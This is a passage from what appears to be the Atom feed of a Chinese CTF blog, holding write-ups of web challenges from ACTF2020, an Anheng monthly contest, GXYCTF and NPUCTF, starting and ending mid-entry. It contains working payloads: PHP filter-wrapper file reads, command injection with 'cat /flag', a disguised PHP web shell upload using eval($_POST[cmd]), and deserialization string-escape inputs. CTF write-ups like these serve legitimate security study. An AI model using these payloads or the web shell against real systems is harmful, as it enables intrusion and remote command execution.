class="line">rr = re.compile(<span class="string">r"[0-9]+ [+|-] [0-9]+"</span>)</span><br><span class="line"></span><br><span class="line">r = s.get(url)</span><br><span class="line">r.encoding = <span class="string">"utf-8"</span></span><br><span class="line">data = &#123;<span class="string">"answer"</span>:eval(rr.findall(r.text)[<span class="number">0</span>])&#125;</span><br><span class="line">r = s.post(url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    answer = eval(rr.findall(r.text)[<span class="number">0</span>])</span><br><span class="line">    data = &#123; <span class="string">"answer"</span> : answer &#125;</span><br><span class="line">    r = s.post( url , data=data)</span><br><span class="line">    r.encoding = <span class="string">"utf-8"</span></span><br><span class="line">    print(<span class="string">'[+%d]:'</span>%(i) + str(answer))</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;禁止套娃&quot;&gt;&lt;a href=&quot;#禁止套娃&quot; class=&quot;headerlink&quot; title=&quot;禁止套娃&quot;&gt;&lt;/a&gt;禁止套娃&lt;/h2&gt;&lt;p&gt;扫描目录发现git泄露&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="web" scheme="https://sunny250.github.io/tags/web/"/>
    
      <category term="刷题" scheme="https://sunny250.github.io/tags/%E5%88%B7%E9%A2%98/"/>
    
      <category term="gxyctf2019" scheme="https://sunny250.github.io/tags/gxyctf2019/"/>
    
  </entry>
  
  <entry>
    <title>ACTF2020刷题</title>
    <link href="https://sunny250.github.io/2020/04/26/ACTF%E5%88%B7%E9%A2%982020/"/>
    <id>https://sunny250.github.io/2020/04/26/ACTF%E5%88%B7%E9%A2%982020/</id>
    <published>2020-04-26T04:42:45.000Z</published>
    <updated>2020-04-26T04:42:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h2><p>简单为协议包含</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  然后base64解密</span><br><span class="line"></span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;9dc5b2d8-37cf-45a6-b5a3-68b3d5c6c2e5&#125;</span><br></pre></td></tr></table></figure><h2 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h2><p>没有进行过滤处理，考的是linux的知识点。一行linux语句如何执行多条linux语句。使用<code>&amp;&amp;</code>连接，或者分号<code>;</code>隔开。也可以使用管道符号<code>｜</code></p><p>但是在此处只能使用｜和分号。（不太清楚）</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | cat &#x2F;flag</span><br><span class="line">或者</span><br><span class="line">127.0.0.1;cat &#x2F;flag</span><br></pre></td></tr></table></figure><h2 id="BackupFile"><a href="#BackupFile" class="headerlink" title="BackupFile"></a>BackupFile</h2><p>扫描目录发现备份文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sunny250@kali ~ <span class="comment"># dirb http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/ ~/web/dictionaries/CTFwebdir.txt </span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Apr 26 13:01:43 2020</span><br><span class="line">URL_BASE: http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/</span><br><span class="line">WORDLIST_FILES: /Users/sx/web/dictionaries/CTFwebdir.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 53                                                            </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/ ----</span><br><span class="line">+ http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/index.php.bak (CODE:200|SIZE:347)</span><br><span class="line">+ http://5c64e8b8-c5fa-41d4-8c5e-ad84cf14332e.node3.buuoj.cn/flag.php (CODE:200|SIZE:0)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Apr 26 13:01:46 2020</span><br><span class="line">DOWNLOADED: 53 - FOUND: 2</span><br></pre></td></tr></table></figure><p>访问index.php.bak得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若类型比较会先转换，字符串于整型对比，都会转换成整型。</p><blockquote><p><a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">参考文章</a></p><p><a href="https://www.php.net/manual/en/function.intval.php" target="_blank" rel="noopener">intval函数</a></p></blockquote><p>输入key=123即可</p><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>打开题目是一个灯，鼠标移动到灯泡之后可以看见一个上传界面</p><p>直接上传1.php发现被禁止，尝试掐后缀，发现phtml可以</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 32d2077b-2b33-467c-93db-234875e1f69e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------380150826415384369013004740571</span><br><span class="line"><span class="attribute">Content-Length</span>: 406</span><br><span class="line"><span class="attribute">Origin</span>: http://32d2077b-2b33-467c-93db-234875e1f69e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://32d2077b-2b33-467c-93db-234875e1f69e.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------380150826415384369013004740571</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="upload_file"; filename="1.phtml"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/gif</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a</span></span><br><span class="line">&lt;script language="php"&gt; </span><br><span class="line"><span class="attribute">eval($_POST[cmd]);</span></span><br><span class="line"><span class="attribute">&lt;/script&gt;</span></span><br><span class="line"><span class="attribute">-----------------------------380150826415384369013004740571</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line"><span class="attribute">upload</span></span><br><span class="line"><span class="attribute">-----------------------------380150826415384369013004740571--</span></span><br></pre></td></tr></table></figure><p>然后得到上传地址，使用蚁剑连接，拿flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;Include&quot;&gt;&lt;a href=&quot;#Include&quot; class=&quot;headerlink&quot; title=&quot;Include&quot;&gt;&lt;/a&gt;Include&lt;/h2&gt;&lt;p&gt;简单为协议包含&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="web" scheme="https://sunny250.github.io/tags/web/"/>
    
      <category term="wp" scheme="https://sunny250.github.io/tags/wp/"/>
    
      <category term="刷题记录" scheme="https://sunny250.github.io/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>安恒月赛20200425</title>
    <link href="https://sunny250.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B20200425/"/>
    <id>https://sunny250.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B20200425/</id>
    <published>2020-04-25T05:36:03.000Z</published>
    <updated>2020-04-25T05:36:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezunserialize"><a href="#Ezunserialize" class="headerlink" title="Ezunserialize"></a>Ezunserialize</h2><p>打开就有源码</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $c = <span class="string">'a'</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line">$b = unserialize(read(write(serialize($a))));</span><br></pre></td></tr></table></figure><p>看见替换想到字符串逃逸</p><p>因为A类中的username，password可控。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username =<span class="string">'\0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b=<span class="keyword">new</span> C;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;c=<span class="string">"flag.php"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=<span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($a); <span class="comment">//O:1:"A":2:&#123;s:8:"username";s:2:"\0";s:8:"password";O:1:"B":1:&#123;s:1:"b";O:1:"C":1:&#123;s:1:"c";s:8:"flag.php";&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>在经过替换函数后，字符减少了3个。正常的序列化后的字符串是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;tese&quot;;&#125;</span><br></pre></td></tr></table></figure><p>要使得password的类型变成对象类，就要把原本的字符串类型吃掉。</p><p>从而变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:48:&quot;********&quot;;s:8:&quot;password&quot;;s:74:&quot;0&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0 (8个\0\0\0). b&#x3D;0&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>本地测试通过了，但是远程没打通</p><h2 id="babytricks"><a href="#babytricks" class="headerlink" title="babytricks"></a>babytricks</h2><p>打开题目是一个登录框，查看源码发现提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tips:select * from user where user&#x3D;&#39;$user&#39; and passwd&#x3D;&#39;%s&#39;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;Ezunserialize&quot;&gt;&lt;a href=&quot;#Ezunserialize&quot; class=&quot;headerlink&quot; title=&quot;Ezunserialize&quot;&gt;&lt;/a&gt;Ezunserialize&lt;/h2&gt;&lt;p&gt;打开就有源码&lt;/p&gt;
    
    </summary>
    
    
      <category term="比赛记录" scheme="https://sunny250.github.io/categories/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="待补充" scheme="https://sunny250.github.io/tags/%E5%BE%85%E8%A1%A5%E5%85%85/"/>
    
      <category term="刷题" scheme="https://sunny250.github.io/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF</title>
    <link href="https://sunny250.github.io/2020/04/19/NPUCTF/"/>
    <id>https://sunny250.github.io/2020/04/19/NPUCTF/</id>
    <published>2020-04-19T12:52:53.000Z</published>
    <updated>2020-04-19T12:52:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="验证🐎"><a href="#验证🐎" class="headerlink" title="验证🐎"></a>验证🐎</h2><p>给了源码</p><a id="more"></a><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">'./key.js'</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">'md5'</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">'hex'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">'./index.html'</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">'&#123;&#123;results&#125;&#125;'</span>, results.join(<span class="string">'&lt;br/&gt;'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">'PHPSESSION'</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span></span><br><span class="line">app.get(<span class="string">'/source'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/javascript;charset=utf-8'</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">'./index.js'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  res.set(<span class="string">'Content-Type'</span>, <span class="string">'text/html;charset=utf-8'</span>);</span><br><span class="line">  req.session.admin = req.session.admin || <span class="number">0</span>;</span><br><span class="line">  res.send(render(req.session.results = req.session.results || []))</span><br><span 